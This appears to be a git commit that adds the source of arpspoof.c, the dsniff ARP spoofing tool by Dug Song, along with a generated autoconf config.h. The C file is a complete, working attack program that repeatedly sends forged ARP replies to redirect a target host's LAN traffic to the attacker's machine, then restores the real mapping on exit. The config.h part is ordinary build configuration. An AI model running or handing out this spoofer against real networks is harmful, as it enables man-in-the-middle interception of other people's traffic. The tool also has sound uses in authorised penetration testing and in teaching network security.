8af24a6eaf21090c2a8feb19365d075975cf4c28
Xule Zhou <marcus@Cold-Marcus.attlocal.net>
2017-01-14 02:22:00 -0500

    Initial Commit

---
+++ arpspoof.c
@@ -0,0 +1,210 @@
+/*
+ * arpspoof.c
+ *
+ * Redirect packets from a target host (or from all hosts) intended for
+ * another host on the LAN to ourselves.
+ *
+ * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
+ *
+ * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
+ */
+
+#include "config.h"
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <netinet/in.h>
+
+#include <stdio.h>
+#include <string.h>
+#include <signal.h>
+#include <err.h>
+#include <libnet.h>
+#include <pcap.h>
+
+#include "arp.h"
+#include "version.h"
+
+#ifndef HAVE_ETHER_NTOA
+extern char *ether_ntoa(struct ether_addr *);
+#endif
+
+static libnet_t *l;
+static struct ether_addr spoof_mac, target_mac;
+static in_addr_t spoof_ip, target_ip;
+static char *intf;
+
+static void
+usage(void)
+{
+	fprintf(stderr, "Version: " VERSION "\n"
+		"Usage: arpspoof [-i interface] [-t target] host\n");
+	exit(1);
+}
+
+static int
+arp_send(libnet_t *l, int op, u_int8_t *sha,
+	 in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
+{
+	int retval;
+
+	if (sha == NULL &&
+	    (sha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
+		return (-1);
+	}
+	if (spa == 0) {
+		if ((spa = libnet_get_ipaddr4(l)) == -1)
+			return (-1);
+	}
+	if (tha == NULL)
+		tha = (u_int8_t *) "\xff\xff\xff\xff\xff\xff";
+
+	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
+			     tha, (u_int8_t *)&tpa, l);
+	libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, l, 0);
+
+	fprintf(stderr, "%s ",
+		ether_ntoa((struct ether_addr *)sha));
+
+	if (op == ARPOP_REQUEST) {
+		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
+			ether_ntoa((struct ether_addr *)tha),
+			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
+			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
+	}
+	else {
+		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
+			ether_ntoa((struct ether_addr *)tha),
+			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
+		fprintf(stderr, "%s\n",
+			ether_ntoa((struct ether_addr *)sha));
+	}
+	retval = libnet_write(l);
+	if (retval)
+		fprintf(stderr, "%s", libnet_geterror(l));
+
+	libnet_clear_packet(l);
+
+	return retval;
+}
+
+#ifdef __linux__
+static int
+arp_force(in_addr_t dst)
+{
+	struct sockaddr_in sin;
+	int i, fd;
+
+	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
+		return (0);
+
+	memset(&sin, 0, sizeof(sin));
+	sin.sin_family = AF_INET;
+	sin.sin_addr.s_addr = dst;
+	sin.sin_port = htons(67);
+
+	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
+
+	close(fd);
+
+	return (i == 0);
+}
+#endif
+
+static int
+arp_find(in_addr_t ip, struct ether_addr *mac)
+{
+	int i = 0;
+
+	do {
+		if (arp_cache_lookup(ip, mac, intf) == 0)
+			return (1);
+#ifdef __linux__
+		/* XXX - force the kernel to arp. feh. */
+		arp_force(ip);
+#else
+		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);
+#endif
+		sleep(1);
+	}
+	while (i++ < 3);
+
+	return (0);
+}
+
+static void
+cleanup(int sig)
+{
+	int i;
+
+	if (arp_find(spoof_ip, &spoof_mac)) {
+		for (i = 0; i < 3; i++) {
+			/* XXX - on BSD, requires ETHERSPOOF kernel. */
+			arp_send(l, ARPOP_REPLY,
+				 (u_int8_t *)&spoof_mac, spoof_ip,
+				 (target_ip ? (u_int8_t *)&target_mac : NULL),
+				 target_ip);
+			sleep(1);
+		}
+	}
+	exit(0);
+}
+
+int
+main(int argc, char *argv[])
+{
+	extern char *optarg;
+	extern int optind;
+	char pcap_ebuf[PCAP_ERRBUF_SIZE];
+	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
+	int c;
+
+	intf = NULL;
+	spoof_ip = target_ip = 0;
+
+	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
+		switch (c) {
+		case 'i':
+			intf = optarg;
+			break;
+		case 't':
+			if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
+				usage();
+			break;
+		default:
+			usage();
+		}
+	}
+	argc -= optind;
+	argv += optind;
+
+	if (argc != 1)
+		usage();
+
+	if ((spoof_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
+		usage();
+
+	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
+		errx(1, "%s", pcap_ebuf);
+
+	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
+		errx(1, "%s", libnet_ebuf);
+
+	if (target_ip != 0 && !arp_find(target_ip, &target_mac))
+		errx(1, "couldn't arp for host %s",
+		     libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
+
+	signal(SIGHUP, cleanup);
+	signal(SIGINT, cleanup);
+	signal(SIGTERM, cleanup);
+
+	for (;;) {
+		arp_send(l, ARPOP_REPLY, NULL, spoof_ip,
+			 (target_ip ? (u_int8_t *)&target_mac : NULL),
+			 target_ip);
+		sleep(2);
+	}
+	/* NOTREACHED */
+
+	exit(0);
+}
---
+++ config.h
@@ -0,0 +1,162 @@
+/* config.h.  Generated from config.h.in by configure.  */
+/* config.h.in.  Generated from configure.in by autoheader.  */
+/* Define to 'uint32_t' if <sys/types.h> doesn't define. */
+/* #undef u_int32_t */
+
+/* Define to 'uint64_t' if <sys/types.h> doesn't define. */
+/* #undef u_int64_t */
+
+/* Define to 'u_int32_t' if <sys/types.h> doesn't define. */
+/* #undef in_addr_t */
+
+/* Define if you have the <db.h> header file.  */
+/* #undef HAVE_DB_H */
+
+/* Define if you have the <db_185.h> header file.  */
+#define HAVE_DB_185_H 1
+
+/* Should be in <sys/param.h>, *sigh* */
+#define HAVE_MINMAX 1
+#ifndef HAVE_MINMAX
+#define MIN(a,b)	(((a)<(b))?(a):(b))
+#define MAX(a,b)	(((a)>(b))?(a):(b))
+#endif
+
+
+/* Define to 1 if you have the `dirname' function. */
+#define HAVE_DIRNAME 1
+
+/* Define to 1 if you have the <err.h> header file. */
+#define HAVE_ERR_H 1
+
+/* Define to 1 if you have the `ether_ntoa' function. */
+#define HAVE_ETHER_NTOA 1
+
+/* Define to 1 if you have the <fcntl.h> header file. */
+#define HAVE_FCNTL_H 1
+
+/* Define to 1 if you have the `gethostname' function. */
+#define HAVE_GETHOSTNAME 1
+
+/* Define to 1 if you have the <inttypes.h> header file. */
+#define HAVE_INTTYPES_H 1
+
+/* Define to 1 if you have the <libgen.h> header file. */
+#define HAVE_LIBGEN_H 1
+
+/* Define to 1 if you have the `nsl' library (-lnsl). */
+/* #undef HAVE_LIBNSL */
+
+/* Define to 1 if you have the `resolv' library (-lresolv). */
+#define HAVE_LIBRESOLV 1
+
+/* Define to 1 if you have the `rpcsvc' library (-lrpcsvc). */
+/* #undef HAVE_LIBRPCSVC */
+
+/* Define to 1 if you have the `socket' library (-lsocket). */
+/* #undef HAVE_LIBSOCKET */
+
+/* Define to 1 if you have the `MD5Update' function. */
+/* #undef HAVE_MD5UPDATE */
+
+/* Define to 1 if you have the <memory.h> header file. */
+#define HAVE_MEMORY_H 1
+
+/* Define to 1 if you have the <net/if_tun.h> header file. */
+/* #undef HAVE_NET_IF_TUN_H */
+
+/* Define to 1 if you have the `socket' function. */
+#define HAVE_SOCKET 1
+
+/* Define to 1 if you have the <stdint.h> header file. */
+#define HAVE_STDINT_H 1
+
+/* Define to 1 if you have the <stdlib.h> header file. */
+#define HAVE_STDLIB_H 1
+
+/* Define to 1 if you have the `strdup' function. */
+#define HAVE_STRDUP 1
+
+/* Define to 1 if you have the `strftime' function. */
+#define HAVE_STRFTIME 1
+
+/* Define to 1 if you have the <strings.h> header file. */
+#define HAVE_STRINGS_H 1
+
+/* Define to 1 if you have the <string.h> header file. */
+#define HAVE_STRING_H 1
+
+/* Define to 1 if you have the `strlcat' function. */
+#define HAVE_STRLCAT 1
+
+/* Define to 1 if you have the `strlcpy' function. */
+#define HAVE_STRLCPY 1
+
+/* Define to 1 if you have the `strsep' function. */
+#define HAVE_STRSEP 1
+
+/* Define to 1 if you have the `strstr' function. */
+#define HAVE_STRSTR 1
+
+/* Define to 1 if you have the <sys/ioctl.h> header file. */
+#define HAVE_SYS_IOCTL_H 1
+
+/* Define to 1 if you have the <sys/queue.h> header file. */
+#define HAVE_SYS_QUEUE_H 1
+
+/* Define to 1 if you have the <sys/stat.h> header file. */
+#define HAVE_SYS_STAT_H 1
+
+/* Define to 1 if you have the <sys/types.h> header file. */
+#define HAVE_SYS_TYPES_H 1
+
+/* Define to 1 if you have the <unistd.h> header file. */
+#define HAVE_UNISTD_H 1
+
+/* Define to 1 if you have the `warnx' function. */
+#define HAVE_WARNX 1
+
+/* Define to the address where bug reports for this package should be sent. */
+#define PACKAGE_BUGREPORT ""
+
+/* Define to the full name of this package. */
+#define PACKAGE_NAME ""
+
+/* Define to the full name and version of this package. */
+#define PACKAGE_STRING ""
+
+/* Define to the one symbol short name of this package. */
+#define PACKAGE_TARNAME ""
+
+/* Define to the home page for this package. */
+#define PACKAGE_URL ""
+
+/* Define to the version of this package. */
+#define PACKAGE_VERSION ""
+
+/* Define as the return type of signal handlers (`int' or `void'). */
+#define RETSIGTYPE void
+
+/* Define to 1 if you have the ANSI C header files. */
+#define STDC_HEADERS 1
+
+/* Define to 1 if your <sys/time.h> declares `struct tm'. */
+/* #undef TM_IN_SYS_TIME */
+
+/* Define to 1 if the X Window System is missing or not being used. */
+/* #undef X_DISPLAY_MISSING */
+
+/* Define to empty if `const' does not conform to ANSI C. */
+/* #undef const */
+
+/* Define to `u_int32_t' if <sys/types.h> does not define. */
+/* #undef in_addr_t */
+
+/* Define to `unsigned int' if <sys/types.h> does not define. */
+/* #undef size_t */
+
+/* Define to `uint32_t' if <sys/types.h> does not define. */
+/* #undef u_int32_t */
+
+/* Define to `uint64_t' if <sys/types.h> does not define. */
+/* #undef u_int64_t */
